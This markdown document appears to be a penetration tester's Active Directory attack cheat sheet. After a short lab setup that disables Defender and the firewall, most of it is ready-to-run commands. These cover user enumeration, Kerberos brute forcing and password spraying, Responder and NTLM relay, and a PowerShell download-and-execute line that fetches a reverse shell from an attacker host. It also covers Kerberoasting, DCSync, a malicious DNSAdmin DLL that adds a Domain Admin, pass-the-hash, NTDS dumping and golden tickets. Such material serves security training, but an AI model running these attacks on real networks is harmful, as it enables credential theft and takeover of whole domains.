<!-- omit in toc -->
# Active Directory

<!-- omit in toc -->
## Table of Contents
1. [Configure AD](#configure-ad)
2. [Enumeration](#enumeration)
   1. [Enumerate Machines of the Domain](#enumerate-machines-of-the-domain)
   2. [SMB](#smb)
   3. [Access Shared Resource](#access-shared-resource)
   4. [RPC](#rpc)
      1. [Null Sessionls](#null-sessionls)
      2. [Enumerate Domain Users](#enumerate-domain-users)
   5. [Kerberos](#kerberos)
      1. [User Enumeration](#user-enumeration)
      2. [Password Spray](#password-spray)
      3. [Brute Force User](#brute-force-user)
      4. [Brute Force Users and Passwords](#brute-force-users-and-passwords)
   6. [Password Spraying](#password-spraying)
3. [Exploitation](#exploitation)
   1. [Upload and Download Files in Windows](#upload-and-download-files-in-windows)
      1. [HTTP](#http)
      2. [CMD](#cmd)
      3. [Powershell](#powershell)
      4. [SMB](#smb-1)
   2. [SMB Relay](#smb-relay)
   3. [NTLM Relay](#ntlm-relay)
      1. [¿How to know if target is vulnerable?](#how-to-know-if-target-is-vulnerable)
      2. [Dump SAM](#dump-sam)
      3. [Command Execution](#command-execution)
      4. [Reverse Shell](#reverse-shell)
      5. [IPv6](#ipv6)
   4. [LDAP Domain Dump](#ldap-domain-dump)
   5. [Kerberoasting](#kerberoasting)
      1. [¿How to know if target is vulnerable?](#how-to-know-if-target-is-vulnerable-1)
      2. [List Vulnerable Machines](#list-vulnerable-machines)
      3. [TGS](#tgs)
         1. [Rubeus](#rubeus)
   6. [ASRepRoast](#asreproast)
      1. [¿How to know if target is vulnerable?](#how-to-know-if-target-is-vulnerable-2)
      2. [TGT](#tgt)
         1. [Rubeus](#rubeus-1)
   7. [DCSync](#dcsync)
      1. [Mimikatz](#mimikatz)
   8. [DNS Admin](#dns-admin)
   9. [Malicious SCF File](#malicious-scf-file)
   10. [Evil-WinRM](#evil-winrm)
   11. [PsExec](#psexec)
   12. [SmbExec](#smbexec)
   13. [WmiExec](#wmiexec)
   14. [PassTheHash](#passthehash)
4. [Post-Exploitation](#post-exploitation)
   1. [Authentication spraying](#authentication-spraying)
      1. [Check acces to all the machines of the domain](#check-acces-to-all-the-machines-of-the-domain)
      2. [Activate RDP in all the machines of the domain](#activate-rdp-in-all-the-machines-of-the-domain)
      3. [Execute commands in all the machines of the domain](#execute-commands-in-all-the-machines-of-the-domain)
   2. [Dump NTDS in the DC](#dump-ntds-in-the-dc)
   3. [Mimikatz](#mimikatz-1)
         1. [Acceder a los recursos privilegiados del DC](#acceder-a-los-recursos-privilegiados-del-dc)
         2. [Convertir Golden Ticket a Ccache](#convertir-golden-ticket-a-ccache)
   4. [Salsa tools](#salsa-tools)
   5. [Ebowla](#ebowla)

## Configure AD

- Create 3 virtual machines:
  - 1 Windows Server (Domain Controller).
  - 2 Windows 10 (Workstations).
- Change PC names in Configuration > System > Rename PC.
- Configure `DC`:
  - Server Administrator > Administrate > Add Roles and Features.
  - Feature or role-based installation > Select a server from the server group > Active Directory Domain Services > Add features > Next > Next > Next > Install.
  - Promote this server to domain controller > Add a new forest > Domain name > Password > Next > Next > Next > Next > Next > Install.
- Disable `Defender` in all the machines:
  - In the `DC`: Powershell > `Uninstall-WindowsFeature -Name Windows-Defender` 
  - In the `Workstations`: Windows Security > Virus and Threat Protection > Disable all.
- Disable `Firewall` in the `Workstations`:
  - Windows Defender Firewall > Enable or disable Windows Defender Firewall > Disable all.
- Change `DNS` configuration of the Workstations so that they can resolve the domain names:
  - Network Connections > Ethernet0 Status > Properties > TCP IPv4 > Use the following `DNS` server addresses (IP address of the `DC`).
- Create AD users in `DC`:
  - Server Administrator > Tools > Active Directory Users and Computers > Open Domain > Users > Add user > Fill in user and password > Uncheck `User must change password at next login` > Check `Password never expires`.
- Connect `Workstation` to `DC`:
  - Get access to work or school > Connect > Join this device to a local Active Directory domain > Domain name > User and password (From users created on the DC).
- Make a user an administrator of a computer in the AD (If we enumerate it with `CME`, having correct credentials, the computer will be `Pwn3d!`):
  - Computer Management > Local Users and Groups > Groups > Administrators > Add > Type User > OK



## Enumeration

### Enumerate Machines of the Domain

```bash
cme {smb, winrm, ssh, ldap, mssql} 10.10.10.0/24
```

### SMB

#### List Shared Resources

```bash
smblient -U "domain.local\user%password" -L 10.10.10.1
```

### Access Shared Resource

```bash
smblient -U "domain.local\user%password" //10.10.10.1/Shared
```

#### Get Every File in a Directory

```bash
smb> prompt off

smb> mget *
```

#### CME

```bash
cme smb 10.10.10.1 -u 'user' -p 'password' --shares
```



### RPC

#### Null Sessionls

In some cases, we can connect to the `RPC` service without having credentials:

```bash
rpcclient -U "" 10.10.10.1 -N
```

#### Enumerate Domain Users

To enumerate the users of the domain, having valid credentials, we use the following command:

```bash
rpcclient -U "domain.local\user%password" 10.10.10.1 -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v '0x'
```

To enumerate `RIDs` of the users:

```bash
rpcclient -U "domain.local\user%password" 10.10.10.1 -c "enumdomusers" | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'
```

If we want to display the name and description of every user in the domain:

```bash
for rdi in $(rpcclient -U "domain.local\user%password" 10.10.10.1 -c "enumdomusers" | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo 'RID $rid: '; rpcclient -U "domain.local\user%password" 10.10.10.1 -c "queryuser $rid" | grep -E -i 'name|description'; done
```

If we want to display the various groups that are in the AD, we can use the following commands (Their `RIDs` are going to be displayed):

```bash
rpcclient -U "domain.local\user%password" 10.10.10.1 -c "enumdomgroups"
```

If we want to display the users that belong to a particular group, we can use the following command (Their `RIDs` are going to be displayed):

```bash
rpcclient -U "domain.local\user%password" 10.10.10.1 -c "querygroupmem 0x200"
```

We can aso display all the information belonging a user, knowing his `RID`and the following command:

```bash
rpcclient -U "domain.local\user%password" 10.10.10.1 -c "queryuser 0x1f4"
```

### Kerberos

If we have the Kerberos service running, we can use the following commands to enumerate further.

#### User Enumeration

```bash
./kerbrute userenum -d domain.local users.txt
```

#### Password Spray

```bash
./kerbrute passwordspray -d domain.local domain_users.txt password
```

#### Brute Force User

```bash
./kerbrute bruteuser -d domain.local passwords.txt user
```

#### Brute Force Users and Passwords

```bash
cat credentials.txt | ./kerbrute  -d domain.local bruteforce -
```


### Password Spraying

In case of having a list of users and passwords, we can use the following command to validate them:

```bash
cme {smb, winrm, ssh, ldap, mssql} -u users.txt -p passwords.txt
```

If we don't want the process to stop once valid credentials are found, we can use the  `--continue-on-success` flag.

### Enumerate AD with Bloodhound

`Bloodhound` is a program that is used to enumerate AD environments. This program needs a harvester, that collects all the information of the AD, in this case we will use `SharpHound` . This harvester, has to be executed in a machine belonging to the domain, that means we need valid user credentials in order to use `BloodHound`.

To launch `Bloodhound` we will use the following commands:

```bash
neo4j console
```

```bash
bloodhound
```

As we have said, we need a harvester that collects information of the AD. To harvest this information, we will upload the `Sharphound.ps1` file to the target machine. Them we will use the following command to create the `.zip`file containing all the information of the AD:

```bash
Invoke-Bloodhound -Collection Method All
```

This will create a `.zip` in the current directory. We will move this file to the attackers machine and lastly we will import it to `Bloodhound`.


## Exploitation

### Upload and Download Files in Windows

#### HTTP

First, we will need to create an `HTTP` server that contains the files that we want to download in the target machine, to do this we will use the `python3 -m http.server` command.

#### CMD

To download the files hosted in the `HTTP` from the `CMD`,  we can use any of this commands:

```powershell
Certutil.exe -f -split -urlcache http://10.10.10.2:8000/file file

bitsadmin /transfer job http://10.10.10.2:8000/file file

curl http://10.10.10.2:8000/file -o file
```

#### Powershell

To download the files hosted in the `HTTP` from `Powershell`,  we can use any of this commands:

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.2:8000/file')

iwr -Uri http://10.10.10.2:8000/file -OutFile file

wget http://10.10.10.2:8000/file -OutFile file
```

#### SMB

In case of needing file upload and file download, we will create an `SMB` shared folder:

```bash
impacket-smbserver smbFolder $(share) -smb2support
```

Then, we can use the following command in the target machine to download the file:

```powershell
copy \\10.10.10.2\smbFolder\file
```

If we want to upload files to the shared `SMB` folder, we can mount it. To do this:

```powershell
net use x: \\10.10.10.2\smbFolder\
net use # Para listar los recursos compartidos en red
copy file X:\file
```

If we want to unmount the shared folder:

```powershell
net use x: /delete
```


### SMB Relay

This vulnerability abuses  failled `SMB` connections. The most used tool for this is `Responder.py`. `Responder` is a tool that poisons network traffic, it can be configured in the  `/usr/share/responder/Responder.conf` directory. To poison the trafic with `Responder`:

```bash
python3 Responder.py -I eth0 -rdw
```

This tool will show us the `Net-NTLMv2` hashes of the users having failed `SMB` connections. Have in mind that `Net-NTLMv2` hashes are not usable to do  `PassTheHass`, but they can be cracked offline. 

To crack `Net-NTLMv2` hashes:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```


### NTLM Relay

#### ¿How to know if target is vulnerable?

`SMB`doesn't have to be signed.

#### Dump SAM

Change the configuration of Responder in `/usr/share/responder/Responder.conf`. We have to  switch `Off` `SMB` and `HTTP`.

Create a file named `targets.txt`, include the IPs that we want to compromise.

Use the following commands with the `ntlmrelayx.py` y `responder.py` programs: 

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

```bash
python3 Responder.py -I eth0 -rdw
```

In case that a user has `Administrator` privileges in a machine of the AD and acceses a shared resource that is not available, we can dump the `SAM` of that machine.

As it fails to validate the legitimacy of the origin, the `ntlmrelayx.py` program intercepts the connection that is looking for an invalid network resource. In case there is a user who is an `Administrator` of the `target` machine, `ntlmrelayx.py` will redirect the flow of that authentication to the victim machine, which will allow us to dump the `SAM` of the victim machine.

#### Command Execution

You can also execute commands in the target machine, using the same method but changing some arguments in `ntlmrelayx.py`. We will use the following command to perfom the attack:

```bash
ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
```

```bash
python3 Responder.py -I eth0 -rdw
```

#### Reverse Shell

In this case, if we want to access to the machine, we can send the reverse shell from `nishang/Shells/Invoke-PowershellTCP.ps1`. First, we have to modify the reverse shell adding the following line to the end of the file: `Invoke-PoweshellTCP -Reverse -IPAddress 10.10.10.10 -Port 443`. This will allow us to load the module and run it at the same time. The, we will be listening for a connection with `nc -nlvp 443` and will share the file with `python3 -m http.server`. Last, we will execute the following commands:

```bash
ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8000/Invoke-PowershellTCP.ps1')'
```

```bash
python3 Responder.py -I eth0 -rdw
```

We will recieve a connection from the reverse shell in the port that we are listening.

#### IPv6

The last attack can be dome in IPv6 as well but with other tools. First we will use the `mitm6` to poison the network traffic:

```bash
mitm6 -d domain.local
```

```bash
ntlmrelayx.py -6 -wh 10.10.10.10 -t smb://10.10.10.1 -socks -debug -smb2support
```

This will open an interactive session of the `ntlmrelayx.py` tool. We will use the `socks` command to list the available `relays`. If the user tries to access to a shared resource that is not available, a new `relay` will apear. If we have `AdminStatus` to `True`, it means that we have received the authentication of an `Administrator`user. In the `/etc/proxychains.conf` file we will add `socks4 127.0.0.1 1080` in the end.  

Then we will use `CrackMapExec` to connect to the machine (Password can be anything):

```bash
proxychains cme smb 10.10.10.1 -u 'user' -p 'randompass' -d domain
```

We can use the following command to dump the `SAM` of the target macnine:

```bash
proxychains cme smb 10.10.10.1 -u 'user' -p 'randompass' -d domain --sam
```

### LDAP Domain Dump

Having valid credentials, we can list the `LDAP` service and extract valuable information. First we have to run the Apache service using the following command: `service apache2 start`. Then, we will use the `ldapdomaindump.py` tool, to list the service:

```bash
python3 ldapdomaindump.py -u 'domain.local\user' -p 'password' 10.10.10.1
```

After this proccess ends, we can access to the folder where the results have been added from the browser. This will display us the extracted information in a visual way.


### Kerberoasting

#### ¿How to know if target is vulnerable?

To make a machine vulnerable to  `Kerberoasting`, we will use the following command:

```powershell
setspn -a domain.local/user.DC1 domain.local/user
```

#### List Vulnerable Machines

Having valid credentials for the AD. We can list the vulnerable machines on the domain, with a tool of the `impacket` suite, using the following command:

```bash
GetUserSPNs.py domain.local/user:password
```

#### TGS

Once we have checked that the credentials are valid, we can use the `GetUserSPNs.py` tool with the `request` flag to request a `TGS` (Ticket Granting Service) to the `DC`:

```bash
GetUserSPNs.py domain.local/user:password -request
```

This will ask to the `DC` a `TGS`and will diplay it as a hash. At this point, we will crack the hash oflline to obtain the password. In case of obteining the password we will have all the machine of the domain `(Pwn3d!)` in `CME`.

##### Rubeus

We can reproduce the same process above, but instead of using the `impacket` suite and attacking from the attackers machine, uploading the `Rubeus.exe` binary to the target machine. We can retrieve the `TGS` hash with the following command:

```powershell
Rubeus.exe kerberoast /creduser:domain.local\user /credpassword:password
```

### ASRepRoast

#### ¿How to know if target is vulnerable?

In order to make a machine ASRepRoastable we can do the following: Active Directory Users and Computers > Select the user that we want to be vulnerable > Account > Do not require Kerberos preauthentication.


#### TGT

If a user does not have the Kerberos preauthentication enabled, we can list their `TGTs` (Ticket Granting Tickets) using the following command:

```bash
GetNPUsers.py domain.local -no-pass -usersfile users
```

In case that a user is vulerable, we can see how its `TGT` hash is being displayed. We can crack it offline.

##### Rubeus

We can do the same proccess but instead of using the `impacket` from our machine, uploading the `Rubeus.exe` binary to the target machine. We can retrieve the `TGT` hash with the following command:

```powershell
Rubeus.exe asreproast /user:user /domain:domain.local /dc:DC
```


### DCSync

If we have valid credentials for a user and this user has the  `GetChanges` and  `GetChangesAll` privileges over the domain,we can execute an attack named `DCSync`. This attack will allow us to display the `NTLM` hashes of all the users of the domain. Remember that this `NTLM` hashes can be used for the `PassTheHash` technique. To do this:

```bash
secretsdump.py -dc-ip 10.10.10.1 domain.local/user:password@10.10.10.1
```

#### Mimikatz

The same proccess can be done connecting to any machine of the domain, having valid credentials and using `Mimikatz`, to do this:

```powershell
lsadump::dsync /domain:domain.local /user:Administrator
```


### DNS Admin

A user who is member of the `DNSAdmins` group or has write privilege to a `DNS` server object, can load an arbitrary `DLL` with `SYSTEM` privileges on the `DNS` server. This is really intersesting as the `DCs`are used frequently as `DNS` servers.

First, we have to create a malicious `DLL`. In order to do this, we have to create a file named `command.txt`, that contains the commands that are going to be run by `SYSTEM`. In this case, we will create a user named `Hacker` and add it to `Domain Admins` group. First, we have to clone (DNSAdmin-DLL)[https://github.com/kazkansouh/DNSAdmin-DLL] repository. Then, we will change the `DnsPluginInitialize` to the following:

```cpp
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
		system("C:\\Windows\\System32\\net.exe user Hacker Password /add /domain");
		system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

Finally, we execute one of the following commands, so when the `DNSService` restarts, the `DLL` is injected and a new user named Hacker is created:

```powershell
dnscmd dc.domain.local /config /serverlevelplugindll c:\DNSAdmin-DLL.dll

dnscmd dc.domain.local /config /serverlevelplugindll \\10.10.10.2\smbFolder\DNSAdmin-DLL.dll
```

It is not very common, but sometimes you can have permisions to restart the DNS service with the following commands:

```powershell
sc.exe \\dc stop dns
sc.exe \\dc start dns
```


### Malicious SCF File

In case of having writing permissions in any shared resource of the machine, we can create a malicious `SCF` file that has an icon that is hosted in a shared folder controlled by us. If any user enters the folder containing the file in the machine, when the icon is loaded, we will have a succesful connection to the shared folder, and thus the `Net-NTLMv2` of the user that has loaded the icon is going to be displayed. Then, we can crack this hash  offline.

First, using`smbserver`, we will create a shared `SMB` folder.

Then, we will create the malicious `scf` file. It will contain a file in our shared folder as the icon:

```text
[Shell]
Command=2
IconFile=\\10.10.10.2\smbFolder\pwned.ico
[Taskbar]
Command=ToggleDesktop
```

We will then upload this file to the target machine and we will wait until a user sees it. The `Net-NTLMv2` of the user that has loaded the icon is going to be listed in our `SMB` server.


### Evil-WinRM

In the case we have the `WinRM` service available in the target machine and we have valid credentials, we can connect to it using the following command:

```bash
evil-winrm -u 'user' -p 'password' -i 10.10.10.1
```


### PsExec

Once we have valid credentials we can obtain a `powershell` in the target machine:

```bash
psexec.py domain.local/user:password@10.10.10.1
```


### SmbExec

Once we have valid credentials and having the `SMB` service available, we can obtain a shell in the target machine:

```bash
smbexec.py domain.local/user:password@10.10.10.1 cmd.exe
```


### WmiExec

Once we have valid credentials we can obtain a shell in the target machine using `wmi`:

```bash
wmiexec.py domain.local/user:password@10.10.10.1 cmd.exe
```


### PassTheHash

If we have validad `NTLM` hashes, we will use one of the following commands to connect to the target machine:

```bash
psexec.py domain.local/user@10.10.10.1 -hashes {NTLM HASH}
```

```bash
smbexec.py domain.local/user@10.10.10.1 -hashes {NTLM HASH}
```

```bash
wmiexec.py domain.local/user@10.10.10.1 -hashes {NTLM HASH}
```


## Post-Exploitation

### Authentication spraying

#### Check acces to all the machines of the domain

Having valid credentials of `Administrator` in the `DC`, we can use the following command to check if we have access to all the machines in the domain:

```bash
cme smb 10.10.10.0/24 -u 'Administrator' -p 'password'
```

We can see how all the users are `(Pwn3d!)`.

#### Activate RDP in all the machines of the domain

In case of wanting to enable the `RDP` service in all the machines of the domain we can do the following:

```bash
cme smb 10.10.10.0/24 -u 'Administrator' -p 'password' -M rdp -o action=enable
```

#### Execute commands in all the machines of the domain

In case of wanting to execute commands in all the machines of the domain, we can use the following command:

```bash
cme smb 10.10.10.0/24 -u 'Administrator' -p 'password' -x 'whoami'
```


### Dump NTDS in the DC

Once we have valid `Administrator` credentials in the `DC`, we can dump the `NTDS` file. This file has all the users and `NTLM` hashes of the domain:

```bash
cme smb 10.10.10.1 -u 'Administrator' -p 'password' --ntds vss
```

We can later use all this hashes to do `PassTheHash`

### Mimikatz

#### Golden Ticket

Once we have the `Mimikatz` binary in the target machine, we can dump the information of the  `krbtgt` user to create a `Golden Ticket`. We will use the following command:

```powershell
lsadump::lsa /inject /name:krbtgt
```

We will copy this information to a file, as it has some parameters that we need to create the `Golden Ticket`. Then, we will create the `Golden Ticket` whit the following command:

```powershell
kerberos::golden /domain:domain.local /sid: {SID} /rca:{NTLM HASH} /user:Administrator /ticket:golden.kirbi
```

This will generate a `golden.kirbi` file that has the mentioned `Golden Ticket`


##### Acceder a los recursos privilegiados del DC

In most cases, we can't access the privileged resources in the `DC`. If we for example try, with the  `dir\\DC\c$ ` command, to list the content of the `C:` volume in the `DC`, we can see that we can't. As we have seen, we can have a `Golden Ticket` from the DC. Having this ticket, we can use the following command in the target machine, using `Mimikatz`, to do  the  `PassTheTicket`  attack and thus, having enabled privileged resources:

```powershell
kerberos::ptt golden.kirbi
```

##### Convertir Golden Ticket a Ccache

Once we have a `Golden Ticket` in `kirbi` format, we can convert it to `ccache` file. First, using `ticketer.py`, we convert the ticket:

```bash
ticketer.py -nthash {NTLM HASH} -domain-sid {SID} -domain domain.local
```

xOnce we have the `ccache` file, we can use the following commands to connect to the target machine:

```bash
export KRB5CCNAME=/home/g2jz/Administrador.ccache
```

```bash
psexec.py -n -k domain.local/Administrator@DC cmd.exe
```

This will allow us to connect to the server using Kerberos authentication. That means that if the  `Administrator` decides to change his user password, we will be able to access to the target machine regardless.


### Salsa tools

TODO
https://github.com/Hackplayers/Salsa-tools


### Ebowla

TODO
https://github.com/Genetic-Malware/Ebowla-

